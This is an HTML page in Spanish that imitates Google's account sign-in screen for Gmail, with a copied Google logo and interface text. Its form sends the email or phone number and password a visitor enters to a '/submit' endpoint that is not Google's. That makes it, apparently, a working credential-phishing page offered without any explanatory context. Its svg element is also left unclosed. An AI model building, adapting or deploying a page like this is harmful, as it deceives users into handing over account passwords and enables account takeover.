<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Cuentas de Google</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; }
    </style>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">

    <div class="w-full max-w-[450px] p-8 sm:border border-gray-300 rounded-lg">
        <div class="flex justify-center mb-4">
            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
                <path d="M7.1 11.5v3.3h5.1c-.2 1.1-.7 2-1.5 2.6-1.1.7-2.4 1.2-3.6 1.2-3.1 0-5.7-2.5-5.7-5.7s2.6-5.7 5.7-5.7c1.5 0 2.8.5 3.9 1.4L13.4 6c-1.6-1.5-3.8-2.5-6.3-2.5-4.9 0-8.9 4-8.9 8.9s4 8.9 8.9 8.9c3 0 5.1-1 6.8-2.7 1.8-1.7 2.4-4.2 2.4-6.3 0-.6-.1-1.1-.2-1.5H7.1z" fill="#4285F4"/>
                <path d="M22.9 8.7c-2.7 0-4.9 2-4.9 4.8s2.2 4.8 4.9 4.8 4.9-2 4.9-4.8-2.2-4.8-4.9-4.8zm0 7.7c-1.5 0-2.8-1.2-2.8-2.9s1.3-2.9 2.8-2.9 2.8 1.2 2.8 2.9-1.3 2.9-2.8 2.9z" fill="#EA4335"/>
                <path d="M33.7 8.7c-2.7 0-4.9 2-4.9 4.8s2.2 4.8 4.9 4.8 4.9-2 4.9-4.8-2.2-4.8-4.9-4.8zm0 7.7c-1.5 0-2.8-1.2-2.8-2.9s1.3-2.9 2.8-2.9 2.8 1.2 2.8 2.9-1.3 2.9-2.8 2.9z" fill="#FBBC05"/>
                <path d="M44.5 8.7c-2.6 0-4.7 2.1-4.7 4.8s2.1 4.8 4.7 4.8c1.3 0 2.3-.5 3-1.2v1c0 1.8-1 2.8-2.6 2.8-1.3 0-2.1-.9-2.4-1.7l-2.6 1.1c.7 1.8 2.6 3.1 5 3.1 2.9 0 5.4-1.7 5.4-5.2V8.9h-2.8v1.1c-.8-.8-1.9-1.3-3-1.3zm-.2 7.7c-1.5 0-2.6-1.3-2.6-2.9s1.1-2.9 2.6-2.9c1.5 0 2.6 1.3 2.6 2.9 0 1.5-1.1 2.9-2.6 2.9z" fill="#4285F4"/>
                <path d="M54.5 1.5h3v17h-3z" fill="#34A853"/>
                <path d="M64.7 16.2c-1.3 0-2.3-.6-3-1.3l7.4-3-0.3-.7c-.5-1.4-2.1-3.9-4.9-3.9-2.8 0-5.1 2.2-5.1 4.8s2.2 4.8 5.1 4.8c2.2 0 3.5-1.4 4.1-2.2l-2.1-1.4c-.7.9-1.5 1.4-2.3 1.4zm-.2-5.3l4.3 1.8c-.2.5-1 1.2-2.1 1.2-1.4 0-2.5-1.1-2.5-2.7 0-1.6 1.1-3 2.5-3 .9 0 1.7.5 2 1l-6.2 2.7z" fill="#EA4335"/>

        </div>

        <h1 class="text-2xl font-normal text-center text-gray-800 mb-2">Iniciar sesión</h1>
        <p class="text-center text-gray-700 mb-8">Ir a Gmail</p>

        <form action="/submit" method="POST" class="flex flex-col">
            <div class="relative mb-6">
                <input name="username" type="text" placeholder="Correo electrónico o teléfono" required
                    class="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition duration-200">
                <a href="#" class="text-sm text-blue-600 font-medium mt-2 inline-block">¿Olvidaste el correo electrónico?</a>
            </div>

            <div class="relative mb-8">
                <input name="password" type="password" placeholder="Introduce tu contraseña" required
                    class="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition duration-200">
            </div>

            <p class="text-sm text-gray-600 mb-8">
                ¿No es tu computadora? Usa una ventana privada para iniciar sesión. 
                <a href="#" class="text-blue-600 font-medium">Más información</a>
            </p>

            <div class="flex justify-between items-center">
                <a href="#" class="text-blue-600 font-medium hover:bg-blue-50 px-2 py-1 rounded transition">Crear cuenta</a>
                <input type="submit" value="Siguiente" 
                    class="bg-blue-600 text-white px-6 py-2 rounded font-medium hover:bg-blue-700 cursor-pointer transition">
            </div>
        </form>
    </div>

</body>
</html>
